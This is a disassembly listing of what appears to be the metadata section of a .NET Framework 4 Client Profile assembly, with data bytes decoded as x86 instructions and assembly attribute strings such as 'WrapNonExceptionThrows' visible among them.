  40ca6e:	0d 05 20 01 01       	or     $0x1012005,%eax
  40ca73:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40ca78:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40ca7d:	01 0e                	add    %ecx,(%esi)
  40ca7f:	0e                   	push   %cs
  40ca80:	05 20 02 01 0e       	add    $0xe010220,%eax
  40ca85:	08 04 20             	or     %al,(%eax,%eiz,1)
  40ca88:	01 02                	add    %eax,(%edx)
  40ca8a:	0e                   	push   %cs
  40ca8b:	03 20                	add    (%eax),%esp
  40ca8d:	00 0e                	add    %cl,(%esi)
  40ca8f:	04 20                	add    $0x20,%al
  40ca91:	01 01                	add    %eax,(%ecx)
  40ca93:	02 04 20             	add    (%eax,%eiz,1),%al
  40ca96:	01 01                	add    %eax,(%ecx)
  40ca98:	0c 04                	or     $0x4,%al
  40ca9a:	20 01                	and    %al,(%ecx)
  40ca9c:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40caa2:	5c                   	pop    %esp
  40caa3:	04 20                	add    $0x20,%al
  40caa5:	00 11                	add    %dl,(%ecx)
  40caa7:	64 04 20             	fs add $0x20,%al
  40caaa:	00 12                	add    %dl,(%edx)
  40caac:	59                   	pop    %ecx
  40caad:	03 28                	add    (%eax),%ebp
  40caaf:	00 0e                	add    %cl,(%esi)
  40cab1:	03 28                	add    (%eax),%ebp
  40cab3:	00 0a                	add    %cl,(%edx)
  40cab5:	03 28                	add    (%eax),%ebp
  40cab7:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40cabd:	5c                   	pop    %esp
  40cabe:	04 28                	add    $0x28,%al
  40cac0:	00 11                	add    %dl,(%ecx)
  40cac2:	64 04 00             	fs add $0x0,%al
  40cac5:	00 00                	add    %al,(%eax)
  40cac7:	00 04 03             	add    %al,(%ebx,%eax,1)
  40caca:	00 00                	add    %al,(%eax)
  40cacc:	00 04 04             	add    %al,(%esp,%eax,1)
  40cacf:	00 00                	add    %al,(%eax)
  40cad1:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40cad8:	06                   	push   %es
  40cad9:	00 00                	add    %al,(%eax)
  40cadb:	00 04 07             	add    %al,(%edi,%eax,1)
  40cade:	00 00                	add    %al,(%eax)
  40cae0:	00 04 08             	add    %al,(%eax,%ecx,1)
  40cae3:	00 00                	add    %al,(%eax)
  40cae5:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40cae8:	00 00                	add    %al,(%eax)
  40caea:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40caed:	00 00                	add    %al,(%eax)
  40caef:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40caf2:	00 00                	add    %al,(%eax)
  40caf4:	00 06                	add    %al,(%esi)
  40caf6:	00 02                	add    %al,(%edx)
  40caf8:	0e                   	push   %cs
  40caf9:	12 61 08             	adc    0x8(%ecx),%ah
  40cafc:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40cb01:	61                   	popa
  40cb02:	06                   	push   %es
  40cb03:	00 02                	add    %al,(%edx)
  40cb05:	0e                   	push   %cs
  40cb06:	05 12 61 05 00       	add    $0x56112,%eax
  40cb0b:	01 01                	add    %eax,(%ecx)
  40cb0d:	12 61 06             	adc    0x6(%ecx),%ah
  40cb10:	00 02                	add    %al,(%edx)
  40cb12:	01 12                	add    %edx,(%edx)
  40cb14:	61                   	popa
  40cb15:	0e                   	push   %cs
  40cb16:	07                   	pop    %es
  40cb17:	00 02                	add    %al,(%edx)
  40cb19:	01 12                	add    %edx,(%edx)
  40cb1b:	61                   	popa
  40cb1c:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40cb21:	01 12                	add    %edx,(%edx)
  40cb23:	61                   	popa
  40cb24:	0d 06 00 02 01       	or     $0x1020006,%eax
  40cb29:	12 61 0c             	adc    0xc(%ecx),%ah
  40cb2c:	06                   	push   %es
  40cb2d:	00 02                	add    %al,(%edx)
  40cb2f:	01 12                	add    %edx,(%edx)
  40cb31:	61                   	popa
  40cb32:	02 06                	add    (%esi),%al
  40cb34:	00 02                	add    %al,(%edx)
  40cb36:	01 12                	add    %edx,(%edx)
  40cb38:	61                   	popa
  40cb39:	0b 06                	or     (%esi),%eax
  40cb3b:	00 02                	add    %al,(%edx)
  40cb3d:	01 12                	add    %edx,(%edx)
  40cb3f:	61                   	popa
  40cb40:	0a 03                	or     (%ebx),%al
  40cb42:	06                   	push   %es
  40cb43:	11 78 04             	adc    %edi,0x4(%eax)
  40cb46:	20 01                	and    %al,(%ecx)
  40cb48:	01 08                	add    %ecx,(%eax)
  40cb4a:	08 01                	or     %al,(%ecx)
  40cb4c:	00 08                	add    %cl,(%eax)
  40cb4e:	00 00                	add    %al,(%eax)
  40cb50:	00 00                	add    %al,(%eax)
  40cb52:	00 1e                	add    %bl,(%esi)
  40cb54:	01 00                	add    %eax,(%eax)
  40cb56:	01 00                	add    %eax,(%eax)
  40cb58:	54                   	push   %esp
  40cb59:	02 16                	add    (%esi),%dl
  40cb5b:	57                   	push   %edi
  40cb5c:	72 61                	jb     0x40cbbf
  40cb5e:	70 4e                	jo     0x40cbae
  40cb60:	6f                   	outsl  %ds:(%esi),(%dx)
  40cb61:	6e                   	outsb  %ds:(%esi),(%dx)
  40cb62:	45                   	inc    %ebp
  40cb63:	78 63                	js     0x40cbc8
  40cb65:	65 70 74             	gs jo  0x40cbdc
  40cb68:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40cb6f:	77 73                	ja     0x40cbe4
  40cb71:	01 05 20 01 01 11    	add    %eax,0x11010120
  40cb77:	71 08                	jno    0x40cb81
  40cb79:	01 00                	add    %eax,(%eax)
  40cb7b:	02 00                	add    (%eax),%al
  40cb7d:	00 00                	add    %al,(%eax)
  40cb7f:	00 00                	add    %al,(%eax)
  40cb81:	05 01 00 00 00       	add    $0x1,%eax
  40cb86:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40cb89:	00 07                	add    %al,(%edi)
  40cb8b:	31 2e                	xor    %ebp,(%esi)
  40cb8d:	30 2e                	xor    %ch,(%esi)
  40cb8f:	30 2e                	xor    %ch,(%esi)
  40cb91:	30 00                	xor    %al,(%eax)
  40cb93:	00 65 01             	add    %ah,0x1(%ebp)
  40cb96:	00 29                	add    %ch,(%ecx)
  40cb98:	2e 4e                	cs dec %esi
  40cb9a:	45                   	inc    %ebp
  40cb9b:	54                   	push   %esp
  40cb9c:	46                   	inc    %esi
  40cb9d:	72 61                	jb     0x40cc00
  40cb9f:	6d                   	insl   (%dx),%es:(%edi)
  40cba0:	65 77 6f             	gs ja  0x40cc12
  40cba3:	72 6b                	jb     0x40cc10
  40cba5:	2c 56                	sub    $0x56,%al
  40cba7:	65 72 73             	gs jb  0x40cc1d
  40cbaa:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40cbb1:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40cbb4:	72 6f                	jb     0x40cc25
  40cbb6:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40cbbd:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40cbc4:	0e                   	push   %cs
  40cbc5:	14 46                	adc    $0x46,%al
  40cbc7:	72 61                	jb     0x40cc2a
  40cbc9:	6d                   	insl   (%dx),%es:(%edi)
  40cbca:	65 77 6f             	gs ja  0x40cc3c
  40cbcd:	72 6b                	jb     0x40cc3a
  40cbcf:	44                   	inc    %esp
  40cbd0:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40cbd7:	61                   	popa
  40cbd8:	6d                   	insl   (%dx),%es:(%edi)
  40cbd9:	65 1f                	gs pop %ds
  40cbdb:	2e 4e                	cs dec %esi
  40cbdd:	45                   	inc    %ebp
  40cbde:	54                   	push   %esp
  40cbdf:	20 46 72             	and    %al,0x72(%esi)
  40cbe2:	61                   	popa
  40cbe3:	6d                   	insl   (%dx),%es:(%edi)
  40cbe4:	65 77 6f             	gs ja  0x40cc56
  40cbe7:	72 6b                	jb     0x40cc54
  40cbe9:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40cbec:	43                   	inc    %ebx
  40cbed:	6c                   	insb   (%dx),%es:(%edi)
  40cbee:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40cbf5:	6f                   	outsl  %ds:(%esi),(%dx)
  40cbf6:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40cbfd:	04 49                	add    $0x49,%al
  40cbff:	74 65                	je     0x40cc66
  40cc01:	6d                   	insl   (%dx),%es:(%edi)
  40cc02:	00 00                	add    %al,(%eax)
  40cc04:	03 07                	add    (%edi),%eax
  40cc06:	01 08                	add    %ecx,(%eax)
  40cc08:	04 00                	add    $0x0,%al
  40cc0a:	01 08                	add    %ecx,(%eax)
  40cc0c:	0e                   	push   %cs
  40cc0d:	03 07                	add    (%edi),%eax
  40cc0f:	01 02                	add    %eax,(%edx)
  40cc11:	05 00 00 12 80       	add    $0x80120000,%eax
  40cc16:	b1 05                	mov    $0x5,%cl
  40cc18:	20 01                	and    %al,(%ecx)
  40cc1a:	0e                   	push   %cs
  40cc1b:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40cc20:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40cc26:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40cc2c:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40cc31:	03 02                	add    (%edx),%eax
  40cc33:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40cc38:	14 07                	adc    $0x7,%al
  40cc3a:	08 0e                	or     %cl,(%esi)
  40cc3c:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40cc42:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40cc48:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40cc4e:	20 03                	and    %al,(%ebx)
  40cc50:	01 11                	add    %edx,(%ecx)
  40cc52:	80 d5 11             	adc    $0x11,%ch
  40cc55:	80 d9 11             	sbb    $0x11,%cl
  40cc58:	80 dd 05             	sbb    $0x5,%ch
  40cc5b:	00 02                	add    %al,(%edx)
  40cc5d:	02 0e                	add    (%esi),%cl
  40cc5f:	0e                   	push   %cs
  40cc60:	06                   	push   %es
  40cc61:	20 01                	and    %al,(%ecx)
  40cc63:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40cc68:	20 01                	and    %al,(%ecx)
  40cc6a:	08 08                	or     %cl,(%eax)
  40cc6c:	07                   	pop    %es
  40cc6d:	00 01                	add    %al,(%ecx)
  40cc6f:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40cc74:	07                   	pop    %es
  40cc75:	20 02                	and    %al,(%edx)
  40cc77:	01 12                	add    %edx,(%edx)
  40cc79:	80 c9 08             	or     $0x8,%cl
  40cc7c:	06                   	push   %es
  40cc7d:	20 01                	and    %al,(%ecx)
  40cc7f:	01 12                	add    %edx,(%edx)
  40cc81:	80 f1 09             	xor    $0x9,%cl
  40cc84:	20 02                	and    %al,(%edx)
  40cc86:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40cc8b:	80 f5 05             	xor    $0x5,%ch
  40cc8e:	20 02                	and    %al,(%edx)
  40cc90:	08 08                	or     %cl,(%eax)
  40cc92:	08 06                	or     %al,(%esi)
  40cc94:	20 02                	and    %al,(%edx)
  40cc96:	01 12                	add    %edx,(%edx)
  40cc98:	0d 02 05 20 02       	or     $0x2200502,%eax
  40cc9d:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40cca0:	09 20                	or     %esp,(%eax)
  40cca2:	03 01                	add    (%ecx),%eax
  40cca4:	12 61 02             	adc    0x2(%ecx),%ah
  40cca7:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40ccad:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40ccb3:	01 0e                	add    %ecx,(%esi)
  40ccb5:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40ccbb:	02 09                	add    (%ecx),%cl
  40ccbd:	20 04 01             	and    %al,(%ecx,%eax,1)
  40ccc0:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40ccc6:	0c 20                	or     $0x20,%al
  40ccc8:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40cccd:	08 08                	or     %cl,(%eax)
  40cccf:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40ccd5:	01 11                	add    %edx,(%ecx)
  40ccd7:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40ccdd:	02 12                	add    (%edx),%dl
  40ccdf:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40cce2:	02 08                	add    (%eax),%cl
  40cce4:	08 05 20 01 08 12    	or     %al,0x12080120
  40ccea:	25 06 00 02 08       	and    $0x8020006,%eax
  40ccef:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40ccf4:	03 08                	add    (%eax),%ecx
  40ccf6:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40ccfb:	20 01                	and    %al,(%ecx)
  40ccfd:	01 12                	add    %edx,(%edx)
  40ccff:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40cd05:	1c 0c                	sbb    $0xc,%al
  40cd07:	07                   	pop    %es
  40cd08:	06                   	push   %es
  40cd09:	1c 02                	sbb    $0x2,%al
  40cd0b:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40cd10:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40cd16:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40cd19:	02 07                	add    (%edi),%al
  40cd1b:	20 02                	and    %al,(%edx)
  40cd1d:	02 08                	add    (%eax),%cl
  40cd1f:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40cd25:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40cd2b:	07                   	pop    %es
  40cd2c:	0a 12                	or     (%edx),%dl
  40cd2e:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40cd35:	08 12 81 
  40cd38:	41                   	inc    %ecx
  40cd39:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40cd3f:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40cd44:	4d                   	dec    %ebp
  40cd45:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cd4a:	0e                   	push   %cs
  40cd4b:	05 00 00 12 81       	add    $0x81120000,%eax
  40cd50:	41                   	inc    %ecx
  40cd51:	05 20 00 12 81       	add    $0x81120020,%eax
  40cd56:	55                   	push   %ebp
  40cd57:	06                   	push   %es
  40cd58:	00 00                	add    %al,(%eax)
  40cd5a:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40cd5f:	00 01                	add    %al,(%ecx)
  40cd61:	0e                   	push   %cs
  40cd62:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40cd67:	01 11                	add    %edx,(%ecx)
  40cd69:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40cd70:	41                   	inc    %ecx
  40cd71:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40cd77:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40cd7e:	49                   	dec    %ecx
  40cd7f:	0e                   	push   %cs
  40cd80:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40cd86:	0e                   	push   %cs
  40cd87:	0e                   	push   %cs
  40cd88:	0e                   	push   %cs
  40cd89:	0e                   	push   %cs
  40cd8a:	05 20 02 01 0e       	add    $0xe010220,%eax
  40cd8f:	1c 07                	sbb    $0x7,%al
  40cd91:	20 02                	and    %al,(%edx)
  40cd93:	01 0e                	add    %ecx,(%esi)
  40cd95:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40cd9b:	0a 02                	or     (%edx),%al
  40cd9d:	10 07                	adc    %al,(%edi)
  40cd9f:	06                   	push   %es
  40cda0:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40cda6:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40cdac:	0e                   	push   %cs
  40cdad:	02 05 20 00 12 81    	add    0x81120020,%al
  40cdb3:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40cdb9:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40cdbf:	91                   	xchg   %eax,%ecx
  40cdc0:	04 20                	add    $0x20,%al
  40cdc2:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40cdc5:	04 07                	add    $0x7,%al
  40cdc7:	02 02                	add    (%edx),%al
  40cdc9:	02 03                	add    (%ebx),%al
  40cdcb:	20 00                	and    %al,(%eax)
  40cdcd:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40cdd0:	02 18                	add    (%eax),%bl
  40cdd2:	02 03                	add    (%ebx),%al
  40cdd4:	07                   	pop    %es
  40cdd5:	01 0e                	add    %ecx,(%esi)
  40cdd7:	05 00 00 12 81       	add    $0x81120000,%eax
  40cddc:	9d                   	popf
  40cddd:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40cde2:	1c 0a                	sbb    $0xa,%al
  40cde4:	07                   	pop    %es
  40cde5:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40cdea:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40cdef:	20 01                	and    %al,(%ecx)
  40cdf1:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40cdf7:	0e                   	push   %cs
  40cdf8:	08 08                	or     %cl,(%eax)
  40cdfa:	06                   	push   %es
  40cdfb:	07                   	pop    %es
  40cdfc:	02 02                	add    (%edx),%al
  40cdfe:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40ce04:	0e                   	push   %cs
  40ce05:	0e                   	push   %cs
  40ce06:	0e                   	push   %cs
  40ce07:	05 20 00 11 81       	add    $0x81110020,%eax
  40ce0c:	ad                   	lods   %ds:(%esi),%eax
  40ce0d:	05 00 00 12 81       	add    $0x81120000,%eax
  40ce12:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40ce17:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40ce1d:	02 11                	add    (%ecx),%dl
  40ce1f:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40ce25:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40ce2c:	12 81 8d 
  40ce2f:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40ce35:	12 41 01             	adc    0x1(%ecx),%al
  40ce38:	0e                   	push   %cs
  40ce39:	05 20 01 01 13       	add    $0x13010120,%eax
  40ce3e:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40ce44:	00 06                	add    %al,(%esi)
  40ce46:	00 02                	add    %al,(%edx)
  40ce48:	0e                   	push   %cs
  40ce49:	0e                   	push   %cs
  40ce4a:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40ce4f:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40ce54:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40ce5a:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40ce60:	c5 09                	lds    (%ecx),%ecx
  40ce62:	00 02                	add    %al,(%edx)
  40ce64:	02 11                	add    (%ecx),%dl
  40ce66:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40ce6c:	07                   	pop    %es
  40ce6d:	02 12                	add    (%edx),%dl
  40ce6f:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40ce74:	01 02                	add    %eax,(%edx)
  40ce76:	0e                   	push   %cs
  40ce77:	10 02                	adc    %al,(%edx)
  40ce79:	06                   	push   %es
  40ce7a:	00 01                	add    %al,(%ecx)
  40ce7c:	01 12                	add    %edx,(%edx)
  40ce7e:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40ce84:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40ce8b:	0e                   	push   %cs
  40ce8c:	1c 11                	sbb    $0x11,%al
  40ce8e:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40ce94:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40ce9b:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40cea1:	05 07 20 02 12       	add    $0x12022007,%eax
  40cea6:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40cead:	12 60 0e             	adc    0xe(%eax),%ah
  40ceb0:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40ceb5:	12 60 12             	adc    0x12(%eax),%ah
  40ceb8:	60                   	pusha
  40ceb9:	06                   	push   %es
  40ceba:	15 12 41 01 12       	adc    $0x12014112,%eax
  40cebf:	60                   	pusha
  40cec0:	10 10                	adc    %dl,(%eax)
  40cec2:	01 01                	add    %eax,(%ecx)
  40cec4:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40cec9:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40cecf:	1e                   	push   %ds
  40ced0:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40ced3:	01 12                	add    %edx,(%edx)
  40ced5:	60                   	pusha
  40ced6:	09 20                	or     %esp,(%eax)
  40ced8:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40cede:	13 00                	adc    (%eax),%eax
  40cee0:	07                   	pop    %es
  40cee1:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40cee6:	12 60 04             	adc    0x4(%eax),%ah
  40cee9:	20 00                	and    %al,(%eax)
  40ceeb:	13 00                	adc    (%eax),%eax
  40ceed:	05 20 01 02 13       	add    $0x13020120,%eax
  40cef2:	00 03                	add    %al,(%ebx)
  40cef4:	07                   	pop    %es
  40cef5:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40cefc:	e5 07                	in     $0x7,%eax
  40cefe:	20 01                	and    %al,(%ecx)
  40cf00:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40cf06:	20 01                	and    %al,(%ecx)
  40cf08:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40cf0e:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40cf11:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40cf17:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40cf1d:	00 02                	add    %al,(%edx)
  40cf1f:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40cf25:	0e                   	push   %cs
  40cf26:	1c 00                	sbb    $0x0,%al
  40cf28:	05 12 82 05 11       	add    $0x11058212,%eax
  40cf2d:	82 09 0e             	orb    $0xe,(%ecx)
  40cf30:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40cf35:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40cf3b:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40cf40:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40cf46:	45                   	inc    %ebp
  40cf47:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40cf4d:	4d                   	dec    %ebp
  40cf4e:	1c 12                	sbb    $0x12,%al
  40cf50:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40cf55:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40cf5a:	0e                   	push   %cs
  40cf5b:	0b 00                	or     (%eax),%eax
  40cf5d:	01 15 12 45 01 13    	add    %edx,0x13014512
  40cf63:	00 12                	add    %dl,(%edx)
  40cf65:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40cf6c:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40cf71:	4d                   	dec    %ebp
  40cf72:	1c 12                	sbb    $0x12,%al
  40cf74:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40cf79:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40cf7e:	0e                   	push   %cs
  40cf7f:	17                   	pop    %ss
  40cf80:	20 0a                	and    %cl,(%edx)
  40cf82:	01 13                	add    %edx,(%ebx)
  40cf84:	00 13                	add    %dl,(%ebx)
  40cf86:	01 13                	add    %edx,(%ebx)
  40cf88:	02 13                	add    (%ebx),%dl
  40cf8a:	03 13                	add    (%ebx),%edx
  40cf8c:	04 13                	add    $0x13,%al
  40cf8e:	05 13 06 13 07       	add    $0x7130613,%eax
  40cf93:	13 08                	adc    (%eax),%ecx
  40cf95:	13 09                	adc    (%ecx),%ecx
  40cf97:	05 07 01 12 82       	add    $0x82120107,%eax
  40cf9c:	0d 07 20 03 01       	or     $0x1032007,%eax
  40cfa1:	0e                   	push   %cs
  40cfa2:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40cfa7:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40cfad:	06                   	push   %es
  40cfae:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40cfb4:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40cfba:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40cfbf:	20 01                	and    %al,(%ecx)
  40cfc1:	01 11                	add    %edx,(%ecx)
  40cfc3:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40cfca:	82 31 05             	xorb   $0x5,(%ecx)
  40cfcd:	20 00                	and    %al,(%eax)
  40cfcf:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40cfd5:	01 12                	add    %edx,(%edx)
  40cfd7:	61                   	popa
  40cfd8:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40cfde:	08 20                	or     %ah,(%eax)
  40cfe0:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40cfe6:	08 1a                	or     %bl,(%edx)
  40cfe8:	07                   	pop    %es
  40cfe9:	0a 12                	or     (%edx),%dl
  40cfeb:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40cff2:	21 1d 05 
  40cff5:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40cffa:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40d001:	05 0c 00 05 01       	add    $0x105000c,%eax
  40d006:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40d00c:	45                   	inc    %ebp
  40d00d:	08 08                	or     %cl,(%eax)
  40d00f:	04 07                	add    $0x7,%al
  40d011:	02 02                	add    (%edx),%al
  40d013:	08 09                	or     %cl,(%ecx)
  40d015:	00 02                	add    %al,(%edx)
  40d017:	01 12                	add    %edx,(%edx)
  40d019:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40d01d:	4d                   	dec    %ebp
  40d01e:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40d023:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40d029:	05 08 05 07 07       	add    $0x7070508,%eax
  40d02e:	02 12                	add    (%edx),%dl
  40d030:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40d034:	08 07                	or     %al,(%edi)
  40d036:	04 12                	add    $0x12,%al
  40d038:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40d03d:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40d042:	1c 06                	sbb    $0x6,%al
  40d044:	07                   	pop    %es
  40d045:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40d04b:	20 01                	and    %al,(%ecx)
  40d04d:	13 00                	adc    (%eax),%eax
  40d04f:	08 04 07             	or     %al,(%edi,%eax,1)
  40d052:	01 12                	add    %edx,(%edx)
  40d054:	60                   	pusha
  40d055:	0e                   	push   %cs
  40d056:	07                   	pop    %es
  40d057:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40d05c:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40d062:	12 60 07             	adc    0x7(%eax),%ah
  40d065:	07                   	pop    %es
  40d066:	04 08                	add    $0x8,%al
  40d068:	05 1d 05 08 04       	add    $0x408051d,%eax
  40d06d:	20 01                	and    %al,(%ecx)
  40d06f:	01 05 04 07 01 11    	add    %eax,0x11010704
  40d075:	64 04 00             	fs add $0x0,%al
  40d078:	01 0b                	add    %ecx,(%ebx)
  40d07a:	0a 04 00             	or     (%eax,%eax,1),%al
  40d07d:	01 0b                	add    %ecx,(%ebx)
  40d07f:	0e                   	push   %cs
  40d080:	04 00                	add    $0x0,%al
  40d082:	01 0b                	add    %ecx,(%ebx)
  40d084:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40d089:	0c 06                	or     $0x6,%al
  40d08b:	00 01                	add    %al,(%ecx)
  40d08d:	0b 11                	or     (%ecx),%edx
  40d08f:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40d096:	04 00 01 
  40d099:	0a 0e                	or     (%esi),%cl
  40d09b:	04 00                	add    $0x0,%al
  40d09d:	01 0a                	add    %ecx,(%edx)
  40d09f:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40d0a4:	0c 06                	or     $0x6,%al
  40d0a6:	00 01                	add    %al,(%ecx)
  40d0a8:	0a 11                	or     (%ecx),%dl
  40d0aa:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40d0b1:	04 00 01 
  40d0b4:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40d0b9:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40d0bd:	ad                   	lods   %ds:(%esi),%eax
  40d0be:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40d0c3:	0c 07                	or     $0x7,%al
  40d0c5:	07                   	pop    %es
